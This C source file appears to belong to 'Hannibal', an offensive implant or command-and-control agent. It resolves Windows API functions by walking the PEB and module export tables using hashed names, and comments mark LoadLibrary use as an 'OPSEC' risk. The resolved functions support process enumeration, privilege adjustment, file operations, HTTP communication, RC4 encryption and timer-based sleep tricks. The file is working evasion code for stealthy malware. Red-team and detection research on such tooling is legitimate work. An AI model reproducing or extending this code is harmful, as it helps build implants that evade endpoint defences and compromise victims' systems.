#include "hannibal.h"

/**
 * TODO: Add logic to check if host process already has the target DLL loaded.
 * TODO: Avoid LoadLibrary
 * OPSEC Warning. Uses LoadLibrary.
 */
SECTION_CODE VOID hannibal_resolve_pointers()
{
    HANNIBAL_INSTANCE_PTR

#ifdef REQUIRE_DLL_NTDLL // Always required

    hannibal_instance_ptr->Modules.Ntdll = get_module_ptr_from_peb(H_MODULE_NTDLL);

    hannibal_instance_ptr->Win32.RtlExitUserThread = get_func_ptr_from_module_eat(hannibal_instance_ptr->Modules.Ntdll, HASH_STR("RtlExitUserThread"));
    hannibal_instance_ptr->Win32.RtlRandomEx = get_func_ptr_from_module_eat(hannibal_instance_ptr->Modules.Ntdll, HASH_STR("RtlRandomEx"));
    hannibal_instance_ptr->Win32.RtlAllocateHeap = get_func_ptr_from_module_eat(hannibal_instance_ptr->Modules.Ntdll, HASH_STR("RtlAllocateHeap"));
    hannibal_instance_ptr->Win32.NtProtectVirtualMemory = get_func_ptr_from_module_eat(hannibal_instance_ptr->Modules.Ntdll, HASH_STR("NtProtectVirtualMemory"));
    hannibal_instance_ptr->Win32.NtQueryInformationProcess = get_func_ptr_from_module_eat(hannibal_instance_ptr->Modules.Ntdll, HASH_STR("NtQueryInformationProcess"));
    hannibal_instance_ptr->Win32.NtSetInformationVirtualMemory = get_func_ptr_from_module_eat(hannibal_instance_ptr->Modules.Ntdll, HASH_STR("NtSetInformationVirtualMemory"));
    hannibal_instance_ptr->Win32.RtlCreateTimerQueue = get_func_ptr_from_module_eat(hannibal_instance_ptr->Modules.Ntdll, HASH_STR("RtlCreateTimerQueue"));
    hannibal_instance_ptr->Win32.NtCreateEvent = get_func_ptr_from_module_eat(hannibal_instance_ptr->Modules.Ntdll, HASH_STR("NtCreateEvent"));
    hannibal_instance_ptr->Win32.RtlCreateTimer = get_func_ptr_from_module_eat(hannibal_instance_ptr->Modules.Ntdll, HASH_STR("RtlCreateTimer"));
    hannibal_instance_ptr->Win32.RtlRegisterWait = get_func_ptr_from_module_eat(hannibal_instance_ptr->Modules.Ntdll, HASH_STR("RtlRegisterWait"));
    hannibal_instance_ptr->Win32.RtlCaptureContext = get_func_ptr_from_module_eat(hannibal_instance_ptr->Modules.Ntdll, HASH_STR("RtlCaptureContext"));
    hannibal_instance_ptr->Win32.NtContinue = get_func_ptr_from_module_eat(hannibal_instance_ptr->Modules.Ntdll, HASH_STR("NtContinue"));
    hannibal_instance_ptr->Win32.NtSignalAndWaitForSingleObject = get_func_ptr_from_module_eat(hannibal_instance_ptr->Modules.Ntdll, HASH_STR("NtSignalAndWaitForSingleObject"));
    hannibal_instance_ptr->Win32.RtlDeleteTimerQueue = get_func_ptr_from_module_eat(hannibal_instance_ptr->Modules.Ntdll, HASH_STR("RtlDeleteTimerQueue"));
    hannibal_instance_ptr->Win32.NtClose = get_func_ptr_from_module_eat(hannibal_instance_ptr->Modules.Ntdll, HASH_STR("NtClose"));
    hannibal_instance_ptr->Win32.NtSetEvent = get_func_ptr_from_module_eat(hannibal_instance_ptr->Modules.Ntdll, HASH_STR("NtSetEvent"));

#endif // NTDLL


#if defined(REQUIRE_DLL_KERNEL32) && defined(REQUIRE_DLL_NTDLL)

    hannibal_instance_ptr->Modules.Kernel32 = get_module_ptr_from_peb(H_MODULE_KERNEL32);

    hannibal_instance_ptr->Win32.CreateProcessW = get_func_ptr_from_module_eat(hannibal_instance_ptr->Modules.Kernel32, HASH_STR("CreateProcessW"));
    hannibal_instance_ptr->Win32.VirtualProtect = get_func_ptr_from_module_eat(hannibal_instance_ptr->Modules.Kernel32, HASH_STR("VirtualProtect"));
    hannibal_instance_ptr->Win32.ExitProcess = get_func_ptr_from_module_eat(hannibal_instance_ptr->Modules.Kernel32, HASH_STR("ExitProcess"));
    hannibal_instance_ptr->Win32.LoadLibraryA = get_func_ptr_from_module_eat(hannibal_instance_ptr->Modules.Kernel32, HASH_STR("LoadLibraryA"));
    hannibal_instance_ptr->Win32.Sleep = get_func_ptr_from_module_eat(hannibal_instance_ptr->Modules.Kernel32, HASH_STR("Sleep"));
    hannibal_instance_ptr->Win32.GetProcAddress = get_func_ptr_from_module_eat(hannibal_instance_ptr->Modules.Kernel32, HASH_STR("GetProcAddress"));
    hannibal_instance_ptr->Win32.VirtualAlloc = get_func_ptr_from_module_eat( hannibal_instance_ptr->Modules.Kernel32, HASH_STR("VirtualAlloc"));
    hannibal_instance_ptr->Win32.VirtualFree = get_func_ptr_from_module_eat( hannibal_instance_ptr->Modules.Kernel32, HASH_STR("VirtualFree"));
    hannibal_instance_ptr->Win32.GetFileAttributesW = get_func_ptr_from_module_eat(hannibal_instance_ptr->Modules.Kernel32, HASH_STR("GetFileAttributesW"));
    hannibal_instance_ptr->Win32.CreateFileW = get_func_ptr_from_module_eat(hannibal_instance_ptr->Modules.Kernel32, HASH_STR("CreateFileW"));
    hannibal_instance_ptr->Win32.CloseHandle = get_func_ptr_from_module_eat(hannibal_instance_ptr->Modules.Kernel32, HASH_STR("CloseHandle"));
    hannibal_instance_ptr->Win32.GetFileSizeEx = get_func_ptr_from_module_eat(hannibal_instance_ptr->Modules.Kernel32, HASH_STR("GetFileSizeEx"));
    hannibal_instance_ptr->Win32.GetLastError = get_func_ptr_from_module_eat(hannibal_instance_ptr->Modules.Kernel32, HASH_STR("GetLastError"));
    hannibal_instance_ptr->Win32.SetFilePointer = get_func_ptr_from_module_eat(hannibal_instance_ptr->Modules.Kernel32, HASH_STR("SetFilePointer"));
    hannibal_instance_ptr->Win32.ReadFile = get_func_ptr_from_module_eat(hannibal_instance_ptr->Modules.Kernel32, HASH_STR("ReadFile"));
    hannibal_instance_ptr->Win32.WriteFile = get_func_ptr_from_module_eat(hannibal_instance_ptr->Modules.Kernel32, HASH_STR("WriteFile"));
    hannibal_instance_ptr->Win32.GetModuleFileNameW = get_func_ptr_from_module_eat(hannibal_instance_ptr->Modules.Kernel32, HASH_STR("GetModuleFileNameW"));
    hannibal_instance_ptr->Win32.GetCurrentProcessId = get_func_ptr_from_module_eat(hannibal_instance_ptr->Modules.Kernel32, HASH_STR("GetCurrentProcessId"));
    hannibal_instance_ptr->Win32.GetComputerNameExW = get_func_ptr_from_module_eat(hannibal_instance_ptr->Modules.Kernel32, HASH_STR("GetComputerNameExW"));
    hannibal_instance_ptr->Win32.SetCurrentDirectoryW = get_func_ptr_from_module_eat(hannibal_instance_ptr->Modules.Kernel32, HASH_STR("SetCurrentDirectoryW"));
    hannibal_instance_ptr->Win32.GetCurrentDirectoryW = get_func_ptr_from_module_eat(hannibal_instance_ptr->Modules.Kernel32, HASH_STR("GetCurrentDirectoryW"));
    hannibal_instance_ptr->Win32.GetLogicalDrives = get_func_ptr_from_module_eat(hannibal_instance_ptr->Modules.Kernel32, HASH_STR("GetLogicalDrives"));
    hannibal_instance_ptr->Win32.GetVolumeInformationW = get_func_ptr_from_module_eat(hannibal_instance_ptr->Modules.Kernel32, HASH_STR("GetVolumeInformationW"));
    hannibal_instance_ptr->Win32.GetDiskFreeSpaceExW = get_func_ptr_from_module_eat(hannibal_instance_ptr->Modules.Kernel32, HASH_STR("GetDiskFreeSpaceExW"));
    hannibal_instance_ptr->Win32.FindFirstFileW = get_func_ptr_from_module_eat(hannibal_instance_ptr->Modules.Kernel32, HASH_STR("FindFirstFileW"));
    hannibal_instance_ptr->Win32.FindNextFileW = get_func_ptr_from_module_eat(hannibal_instance_ptr->Modules.Kernel32, HASH_STR("FindNextFileW"));
    hannibal_instance_ptr->Win32.FindClose = get_func_ptr_from_module_eat(hannibal_instance_ptr->Modules.Kernel32, HASH_STR("FindClose"));
    hannibal_instance_ptr->Win32.FileTimeToSystemTime = get_func_ptr_from_module_eat(hannibal_instance_ptr->Modules.Kernel32, HASH_STR("FileTimeToSystemTime"));
    hannibal_instance_ptr->Win32.SystemTimeToFileTime = get_func_ptr_from_module_eat(hannibal_instance_ptr->Modules.Kernel32, HASH_STR("SystemTimeToFileTime"));
    hannibal_instance_ptr->Win32.CreateDirectoryW = get_func_ptr_from_module_eat(hannibal_instance_ptr->Modules.Kernel32, HASH_STR("CreateDirectoryW"));
    hannibal_instance_ptr->Win32.MoveFileExW = get_func_ptr_from_module_eat(hannibal_instance_ptr->Modules.Kernel32, HASH_STR("MoveFileExW"));
    hannibal_instance_ptr->Win32.CreateToolhelp32Snapshot = get_func_ptr_from_module_eat(hannibal_instance_ptr->Modules.Kernel32, HASH_STR("CreateToolhelp32Snapshot"));
    hannibal_instance_ptr->Win32.Process32FirstW = get_func_ptr_from_module_eat(hannibal_instance_ptr->Modules.Kernel32, HASH_STR("Process32FirstW"));
    hannibal_instance_ptr->Win32.Process32NextW = get_func_ptr_from_module_eat(hannibal_instance_ptr->Modules.Kernel32, HASH_STR("Process32NextW"));
    hannibal_instance_ptr->Win32.OpenProcess = get_func_ptr_from_module_eat(hannibal_instance_ptr->Modules.Kernel32, HASH_STR("OpenProcess"));
    hannibal_instance_ptr->Win32.IsWow64Process = get_func_ptr_from_module_eat(hannibal_instance_ptr->Modules.Kernel32, HASH_STR("IsWow64Process"));
    hannibal_instance_ptr->Win32.DeleteFileW = get_func_ptr_from_module_eat(hannibal_instance_ptr->Modules.Kernel32, HASH_STR("DeleteFileW"));
    hannibal_instance_ptr->Win32.RemoveDirectoryW = get_func_ptr_from_module_eat(hannibal_instance_ptr->Modules.Kernel32, HASH_STR("RemoveDirectoryW"));
    hannibal_instance_ptr->Win32.GetTickCount = get_func_ptr_from_module_eat(hannibal_instance_ptr->Modules.Kernel32, HASH_STR("GetTickCount"));
    hannibal_instance_ptr->Win32.WaitForSingleObjectEx = get_func_ptr_from_module_eat(hannibal_instance_ptr->Modules.Kernel32, HASH_STR("WaitForSingleObjectEx"));
    hannibal_instance_ptr->Win32.WaitForSingleObject = get_func_ptr_from_module_eat(hannibal_instance_ptr->Modules.Kernel32, HASH_STR("WaitForSingleObject"));
    hannibal_instance_ptr->Win32.CreateTimerQueueTimer = get_func_ptr_from_module_eat(hannibal_instance_ptr->Modules.Kernel32, HASH_STR("CreateTimerQueueTimer"));
    hannibal_instance_ptr->Win32.CreateEventW = get_func_ptr_from_module_eat(hannibal_instance_ptr->Modules.Kernel32, HASH_STR("CreateEventW"));
    hannibal_instance_ptr->Win32.CreateTimerQueue = get_func_ptr_from_module_eat(hannibal_instance_ptr->Modules.Kernel32, HASH_STR("CreateTimerQueue"));
    hannibal_instance_ptr->Win32.SetEvent = get_func_ptr_from_module_eat(hannibal_instance_ptr->Modules.Kernel32, HASH_STR("SetEvent"));
    hannibal_instance_ptr->Win32.DeleteTimerQueue = get_func_ptr_from_module_eat(hannibal_instance_ptr->Modules.Kernel32, HASH_STR("DeleteTimerQueue"));
    hannibal_instance_ptr->Win32.CopyFileW = get_func_ptr_from_module_eat(hannibal_instance_ptr->Modules.Kernel32, HASH_STR("CopyFileW"));

#endif // KERNEL32


#if defined(REQUIRE_DLL_USER32) && defined(REQUIRE_DLL_KERNEL32)

    hannibal_instance_ptr->Modules.User32 = hannibal_instance_ptr->Win32.LoadLibraryA("User32"); // Requires Kernel32

    hannibal_instance_ptr->Win32.MessageBoxA = get_func_ptr_from_module_eat(hannibal_instance_ptr->Modules.User32, HASH_STR("MessageBoxA"));

#endif // USER32


#if defined(REQUIRE_DLL_WININET) && defined(REQUIRE_DLL_KERNEL32)

    hannibal_instance_ptr->Modules.WinInet = hannibal_instance_ptr->Win32.LoadLibraryA("Wininet");

    hannibal_instance_ptr->Win32.InternetOpenW = get_func_ptr_from_module_eat(hannibal_instance_ptr->Modules.WinInet, HASH_STR("InternetOpenW"));
    hannibal_instance_ptr->Win32.InternetConnectW = get_func_ptr_from_module_eat(hannibal_instance_ptr->Modules.WinInet, HASH_STR("InternetConnectW"));
    hannibal_instance_ptr->Win32.HttpOpenRequestW = get_func_ptr_from_module_eat(hannibal_instance_ptr->Modules.WinInet, HASH_STR("HttpOpenRequestW")); 
    hannibal_instance_ptr->Win32.HttpSendRequestW = get_func_ptr_from_module_eat(hannibal_instance_ptr->Modules.WinInet, HASH_STR("HttpSendRequestW"));
    hannibal_instance_ptr->Win32.InternetReadFile = get_func_ptr_from_module_eat(hannibal_instance_ptr->Modules.WinInet, HASH_STR("InternetReadFile"));
    hannibal_instance_ptr->Win32.InternetCloseHandle = get_func_ptr_from_module_eat(hannibal_instance_ptr->Modules.WinInet, HASH_STR("InternetCloseHandle"));
    hannibal_instance_ptr->Win32.InternetSetOptionW = get_func_ptr_from_module_eat(hannibal_instance_ptr->Modules.WinInet, HASH_STR("InternetSetOptionW"));
    hannibal_instance_ptr->Win32.InternetQueryOptionW = get_func_ptr_from_module_eat(hannibal_instance_ptr->Modules.WinInet, HASH_STR("InternetQueryOptionW"));
    hannibal_instance_ptr->Win32.HttpAddRequestHeadersW = get_func_ptr_from_module_eat(hannibal_instance_ptr->Modules.WinInet, HASH_STR("HttpAddRequestHeadersW"));

#endif // WININET


#if defined(REQUIRE_DLL_IPHLPAPI) && defined(REQUIRE_DLL_KERNEL32)

    hannibal_instance_ptr->Modules.Iphlpapi = hannibal_instance_ptr->Win32.LoadLibraryA("Iphlpapi");

    hannibal_instance_ptr->Win32.GetAdaptersAddresses = get_func_ptr_from_module_eat(hannibal_instance_ptr->Modules.Iphlpapi, HASH_STR("GetAdaptersAddresses"));

#endif // IPHLAPI


#if defined(REQUIRE_DLL_WS2_32) && defined(REQUIRE_DLL_KERNEL32)

    hannibal_instance_ptr->Modules.Ws2_32 = hannibal_instance_ptr->Win32.LoadLibraryA("Ws2_32");

    hannibal_instance_ptr->Win32.InetNtopW = get_func_ptr_from_module_eat(hannibal_instance_ptr->Modules.Ws2_32, HASH_STR("InetNtopW"));

#endif // WS2_32


#if defined(REQUIRE_DLL_ADVAPI32) && defined(REQUIRE_DLL_KERNEL32)

    hannibal_instance_ptr->Modules.Advapi32 = hannibal_instance_ptr->Win32.LoadLibraryA("Advapi32");
    
    hannibal_instance_ptr->Win32.SystemFunction032 = hannibal_instance_ptr->Win32.GetProcAddress(hannibal_instance_ptr->Modules.Advapi32, "SystemFunction032"); // TODO: Finish get_func_ptr_from_module_eat to handle forwarded functions.
    hannibal_instance_ptr->Win32.LookupAccountSidW = get_func_ptr_from_module_eat(hannibal_instance_ptr->Modules.Advapi32, HASH_STR("LookupAccountSidW"));
    hannibal_instance_ptr->Win32.OpenProcessToken = get_func_ptr_from_module_eat(hannibal_instance_ptr->Modules.Advapi32, HASH_STR("OpenProcessToken"));
    hannibal_instance_ptr->Win32.GetSidSubAuthority = get_func_ptr_from_module_eat(hannibal_instance_ptr->Modules.Advapi32, HASH_STR("GetSidSubAuthority"));
    hannibal_instance_ptr->Win32.LookupPrivilegeValueW = get_func_ptr_from_module_eat(hannibal_instance_ptr->Modules.Advapi32, HASH_STR("LookupPrivilegeValueW"));
    hannibal_instance_ptr->Win32.AdjustTokenPrivileges = get_func_ptr_from_module_eat(hannibal_instance_ptr->Modules.Advapi32, HASH_STR("AdjustTokenPrivileges"));
    hannibal_instance_ptr->Win32.GetTokenInformation = get_func_ptr_from_module_eat(hannibal_instance_ptr->Modules.Advapi32, HASH_STR("GetTokenInformation"));

#endif // ADVAPI32


#if defined(REQUIRE_DLL_BCRYPT) && defined(REQUIRE_DLL_KERNEL32)

    hannibal_instance_ptr->Modules.Bcrypt = hannibal_instance_ptr->Win32.LoadLibraryA("Bcrypt");

    hannibal_instance_ptr->Win32.BCryptGenRandom = get_func_ptr_from_module_eat( hannibal_instance_ptr->Modules.Bcrypt, HASH_STR( "BCryptGenRandom" ) );
    hannibal_instance_ptr->Win32.BCryptOpenAlgorithmProvider = get_func_ptr_from_module_eat( hannibal_instance_ptr->Modules.Bcrypt, HASH_STR( "BCryptOpenAlgorithmProvider" ) );
    hannibal_instance_ptr->Win32.BCryptCloseAlgorithmProvider = get_func_ptr_from_module_eat( hannibal_instance_ptr->Modules.Bcrypt, HASH_STR( "BCryptCloseAlgorithmProvider" ) );

#endif // BCRYPT


}